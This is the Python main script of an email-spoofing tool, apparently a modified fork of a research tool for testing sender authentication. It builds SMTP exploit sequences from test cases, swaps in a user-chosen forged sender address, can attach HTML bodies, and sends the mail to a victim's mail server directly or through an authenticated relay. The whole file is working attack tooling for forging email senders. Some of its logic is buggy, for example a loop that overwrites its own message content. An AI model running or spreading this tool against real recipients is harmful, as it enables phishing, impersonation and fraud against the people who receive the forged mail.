import sys
import simplejson as json
import argparse

from colorama import init

from common.common import *
from common.mail_sender import MailSender
from exploits_builder import ExploitsBuilder

import testcases
from config import config as config_dict

class ESpoofer2():
    def __init__(self, args):
        self.test_cases = testcases.test_cases
        # self.case_id = self.config['case_id'].decode("utf-8")
        self.config = config_dict
        self.args = args    

    def check_configs(self):
        if self.config["case_id"].decode("utf-8") not in self.test_cases:
            print("Error: case_id not found in testcases!")
            return -1
        if self.config['mode'] == 's' and "server" not in self.config["case_id"].decode("utf-8"):
            print("Error: case_id should start with 'server_' in server mode!")
            return -1
        return 0
    
    def list_test_cases(self, case_id=None):
        if case_id == None:
            case_ids = self.test_cases.keys()
            print("%s     %s"% ("Case_id", "Description"))
            print("-------------------------------------")
            for id in case_ids:
                print("%s  %s"% (id, self.test_cases[id].get("description").decode("utf-8")))
            print("\r\nYou can use '-l case_id' options to list details of a specific case.")
        else:
            if case_id in self.test_cases:
                print("Here is the details of "+case_id+":")
                print(json.dumps(self.test_cases[case_id], indent=4))
            else:
                print("Sorry, case_id not found in testcases.")

    def email_headers(self, original_headers, cond, sender=None):
        if cond == True:
            headers_str = original_headers.decode('utf-8')
            headers_str = headers_str.replace("text/plain", "text/html").replace("UTF-8", "ISO-8859-1").replace("s@legitimate.com", sender)
            insertion_point = headers_str.find("MIME-Version")
            headers_str = headers_str[:insertion_point] + 'Content-Transfer-Encoding: 7bit\r\n' + headers_str[insertion_point:]
            modified_headers = headers_str.encode("utf-8")
            return modified_headers
        else:
            return original_headers


    def server_mode(self):

        mail_server = self.config["server_mode"]["recv_mail_server"]
        if not mail_server:
            mail_server = get_mail_server_from_email_address(self.config["victim_address"]) 
            if not mail_server:
                print("Error: mail server can not be resolved, please set recv_mail_server manually in config.py.")
                return -1
        mail_server_port = self.config["server_mode"]["recv_mail_server_port"]
        starttls = self.args.starttls if self.args.starttls else self.config['server_mode']['starttls']

        for case_ids in self.test_cases.keys():
            msg_content = self.test_cases[case_ids]["data"]["other_headers"]
            msg_content = self.email_headers(original_headers=msg_content, cond=False, sender=self.args.sender)

        if self.args.htmlfile:
            msg_content = self.email_headers(original_headers=msg_content, cond=True, sender=self.args.sender)
            
        exploit_builder = ExploitsBuilder(
            test_cases=self.test_cases, 
            config=self.config, 
            subject=self.args.subject, 
            other_headers=msg_content
        )

        smtp_seqs = exploit_builder.generate_smtp_seqs()

        msg_content = self.config['raw_email'] if self.config['raw_email'] else smtp_seqs['msg_content']

        mail_sender = MailSender()
        if self.args.htmlfile:
            mail_sender.set_param((mail_server, mail_server_port), 
                                helo=smtp_seqs['helo'], 
                                mail_from=smtp_seqs['mailfrom'],
                                filename=self.args.htmlfile, 
                                rcpt_to=smtp_seqs['rcptto'], 
                                email_data=msg_content, 
                                starttls=starttls)
        else: 
            mail_sender.set_param((mail_server, mail_server_port), 
                                helo=smtp_seqs['helo'], 
                                mail_from=smtp_seqs['mailfrom'],
                                filename=None, 
                                rcpt_to=smtp_seqs['rcptto'], 
                                email_data=msg_content, 
                                starttls=starttls)
        mail_sender.send_email()
        return 0

    def manual_mode(self):
        if not (self.args.helo and self.args.mfrom and self.args.rcptto and self.args.data and self.args.ip and self.args.port):
            print("Please set -helo, -mfrom, -rcptto, -data, -ip, and -port")
            return -1
        
        mail_sender = MailSender()
        if self.args.htmlfile:
            mail_sender.set_param(
                (self.args.ip, int(self.args.port)),
                helo=self.args.helo.encode("utf-8"),
                mail_from=self.args.mfrom.encode("utf-8"),
                filename=self.args.htmlfile.encode("utf-8"),
                rcpt_to=self.args.rcptto.encode("utf-8"),
                email_data=self.args.data.encode("utf-8"),
                starttls=self.args.starttls
            )
        else:
            mail_sender.set_param(
                (self.args.ip, int(self.args.port)),
                helo=self.args.helo.encode("utf-8"),
                mail_from=self.args.mfrom.encode("utf-8"),
                filename=None,
                rcpt_to=self.args.rcptto.encode("utf-8"),
                email_data=self.args.data.encode("utf-8"),
                starttls=self.args.starttls
            )
        mail_sender.send_email()
        return 0
    
    def client_mode(self):
        mail_server = self.config["client_mode"]["sender_server"]

        if not mail_server:
            print("Error: mail server can not be resolved, please set sending_server manually in config.py.")
            return -1
        
        for case_ids in self.test_cases.keys():
            msg_content = self.test_cases[case_ids]["data"]["other_headers"]
            msg_content = self.email_headers(original_headers=msg_content, cond=False, sender=self.args.sender)

        if self.args.htmlfile:
            msg_content = self.email_headers(original_headers=msg_content, cond=True, sender=self.args.sender)
            
        exploit_builder = ExploitsBuilder(
            test_cases=self.test_cases, 
            config=self.config, 
            subject=self.args.subject, 
            other_headers=msg_content
        )
        smtp_seqs = exploit_builder.generate_smtp_seqs()

        msg_content = self.config["raw_email"] if self.config["raw_email"] else smtp_seqs["msg_content"]

        mail_sender = MailSender()
        auth_proto = self.config["client_mode"].get("auth_proto") if self.config["client_mode"].get("auth_proto") else "LOGIN"

        mail_sender.set_param(
                mail_server,
                helo=b"MacBook-Pro.local",
                mail_from=smtp_seqs['mailfrom'],
                rcpt_to=smtp_seqs['rcptto'],
                filename=self.args.filename,
                email_data=msg_content,
                starttls=True,
                mode="client",
                username=self.config["client_mode"]["username"],
                password=self.config["client_mode"]["password"],
                auth_proto=auth_proto
            )
        mail_sender.send_email()
        return 0
        

    def main(self):

        self.config['mode'] = self.args.mode

        if self.args.list != -1:
            self.list_test_cases(self.args.list)
            return 0
    
        if self.args.caseid:
            self.config['case_id'] = self.args.caseid.encode("utf-8")
            return 0
        
        if self.check_configs() == -1:
            return -1
        
        if self.args.mode == 's':
            self.server_mode()
        elif self.args.mode == 'c':
            self.client_mode()
        elif self.args.mode == 'm':
            self.manual_mode()
        else:
            print("Unsupported mode selected")

        print("Finished!")

def banner():
    print(("""%s                               ____         
    ___  _________  ____  ____  / __/__  _____
    / _ \/ ___/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
    /  __(__  ) /_/ / /_/ / /_/ / __/  __/ /    
    \___/____/ .___/\____/\____/_/  \___/_/     
            /_/                                 %s
        """ % ('\033[93m', '\033[0m')))

def parser_error(errmsg):
    banner()
    print(("Usage: python " + sys.argv[0] + " [Options] use -h for help"))
    print(("Error: " + errmsg))
    sys.exit()    

if __name__ == "__main__":
    init()
    banner()
    parser = argparse.ArgumentParser(
    epilog='\tExample: \r\npython ' + sys.argv[0] + " -m s -id case_a1")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-m', '--mode', choices=['s', 'c', 'm'], default='s', help="Select mode: 's' (default) means server mode; 'c' means clien mode; 'm' means manually setting fields;")
    parser.add_argument('-l', '--list', action='store', default=-1, const=None, nargs='?', help="List all test cases number and short description. `-l case_id' to see details of a specific case.")
    parser.add_argument('-id', '--caseid', default=None, help="Select a specific test case to send email. Effective in server and client mode.")
    parser.add_argument('-tls', '--starttls', action='store_true', help="Enable STARTTLS command.")
    parser.add_argument('-htmlfile', '--htmlfile', type=str, help='Path to the HTML file to be used for emails.')
    parser.add_argument('-subject', '--subject', type=str, help='Subject Line.', default="Test Email")
    parser.add_argument('-sender', '--sender', type=str, help='Sender to spoof', default="s@sender.com")

    parser.add_argument('-helo', '--helo', default=None, help="Set HELO domain manually. Effective in manual mode only.")
    parser.add_argument('-mfrom', '--mfrom', default=None, help="Set MAIL FROM address manually. Effective in manual mode only.")
    parser.add_argument('-rcptto', '--rcptto', default=None, help="Set RCPT TO address manually. Effective in manual mode only.")
    parser.add_argument('-data', '--data', default=None, help="Set raw email in DATA command. Effective in manual mode only.")
    parser.add_argument('-ip', '--ip', default=None, help="Set mail server ip manually. Effective in manual mode only.")
    parser.add_argument('-port', '--port', default=None, help="Set mail server port manually. Effective in manual mode only.")

    args = parser.parse_args()
    email_tester = ESpoofer2(args)
    email_tester.main()
